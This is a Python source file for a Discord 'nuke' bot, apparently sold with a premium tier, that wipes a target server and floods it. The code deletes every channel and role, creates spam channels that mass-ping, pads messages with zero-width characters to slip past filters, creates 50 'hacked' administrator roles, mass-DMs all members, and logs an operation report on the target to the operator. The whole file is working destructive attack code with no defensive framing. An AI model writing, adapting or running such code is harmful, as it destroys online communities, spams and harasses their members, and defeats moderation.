import discord
import asyncio
import aiohttp
import random
import gc
from datetime import datetime

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ STEALTH ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_clean_text(text):
    """Invisible obfuscation for bypass."""
    chars = ["\u200b", "\u200c", "\u200d"]
    return f"{text}{''.join(random.choices(chars, k=3))}"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ EXECUTION ENGINE ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def start_nuke(ctx, bot, name, text, channels_count, pings_count, premium, log_id, icon_url):
    guild = ctx.guild
    start_time = datetime.utcnow()
    
    tasks = [
        *(role.delete() for role in guild.roles if not role.is_default() and not role.managed),
        *(channel.delete() for channel in guild.channels)
    ]
    if premium: tasks.append(premium_tasks(guild, icon_url))
    await asyncio.gather(*tasks, return_exceptions=True)
    
    active_tasks = []
    pings_per_channel = pings_count // channels_count if channels_count > 0 else 0
    remaining = pings_count % channels_count if channels_count > 0 else 0
    
    for i in range(channels_count):
        extra = 1 if i < remaining else 0
        task = asyncio.create_task(create_and_run_spam(guild, name, text, i, pings_per_channel + extra, premium))
        active_tasks.append(task)
        await asyncio.sleep(0.01)
    
    if active_tasks: await asyncio.gather(*active_tasks, return_exceptions=True)
    
    await send_detailed_report(ctx, bot, premium, guild, channels_count, pings_count, log_id, start_time)
    await perform_cleanup()

async def create_and_run_spam(guild, name, text, index, amount, premium):
    try:
        channel = await guild.create_text_channel(f"{name}-{index+1}")
        await spam_messages(channel, text, amount, premium)
    except: pass

async def spam_messages(channel, text, amount, premium):
    for _ in range(amount):
        try:
            final_text = get_clean_text(text) if premium else text
            await channel.send(final_text)
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(e.retry_after if hasattr(e, 'retry_after') else 1.0)
            else: break
        except: break

async def premium_tasks(guild, icon_url):
    tasks = [update_icon(guild, icon_url), create_roles(guild)]
    await asyncio.gather(*tasks, return_exceptions=True)

async def update_icon(guild, url):
    try:
        async with aiohttp.ClientSession() as session, session.get(url) as resp:
            if resp.status == 200: await guild.edit(icon=await resp.read())
    except: pass

async def create_roles(guild):
    tasks = [guild.create_role(name=f"hacked-{i}", permissions=discord.Permissions(administrator=True)) for i in range(50)]
    await asyncio.gather(*tasks, return_exceptions=True)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ DM ALL ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def dm_all(guild, message, premium):
    """Sends a DM to all members. Premium users can customize text."""
    count = 0
    for member in guild.members:
        if member.bot: continue
        try:
            final_msg = get_clean_text(message) if premium else message
            await member.send(final_msg)
            count += 1
            await asyncio.sleep(0.1)
        except: continue
    await perform_cleanup()
    return count

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ CLEANUP & LOGGING ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def perform_cleanup():
    gc.collect()
    await asyncio.sleep(0.1)
    print("[CLEANUP] Memory optimized.")

async def send_detailed_report(ctx, bot, premium, guild, channels, pings, log_id, start_time):
    log_channel = bot.get_channel(log_id)
    if not log_channel: return
    
    end_time = datetime.utcnow()
    duration = (end_time - start_time).total_seconds()
    type_str = "PREMIUM" if premium else "STANDARD"
    
    embed = discord.Embed(title="DETAILED OPERATION REPORT / REPORTE DETALLADO", color=0x2b2d31, timestamp=datetime.utcnow())
    
    server_info = (
        f"**Name / Nombre:** {guild.name}\n"
        f"**ID:** `{guild.id}`\n"
        f"**Owner / Dueno:** {guild.owner.mention} `({guild.owner.id})`\n"
        f"**Boost Level / Nivel:** {guild.premium_tier}\n"
        f"**Members / Miembros:** {guild.member_count}"
    )
    embed.add_field(name="TARGET INFORMATION / INFORMACION DEL OBJETIVO", value=server_info, inline=False)
    
    exec_info = (
        f"**Operator / Operador:** {ctx.author.mention}\n"
        f"**Type / Tipo:** `{type_str}`\n"
        f"**Duration / Duracion:** `{duration:.2f}s`"
    )
    embed.add_field(name="EXECUTION DETAILS / DETALLES DE EJECUCION", value=exec_info, inline=True)
    
    stats_info = (
        f"**Channels / Canales:** {channels}\n"
        f"**Total Pings:** {pings}\n"
        f"**Status / Estado:** Completed & Cleaned / Finalizado y Limpio"
    )
    embed.add_field(name="STATISTICS / ESTADISTICAS", value=stats_info, inline=True)
    
    if guild.icon: embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text="Del1rium Co. | System Optimized")
    
    try: await log_channel.send(embed=embed)
    except: pass
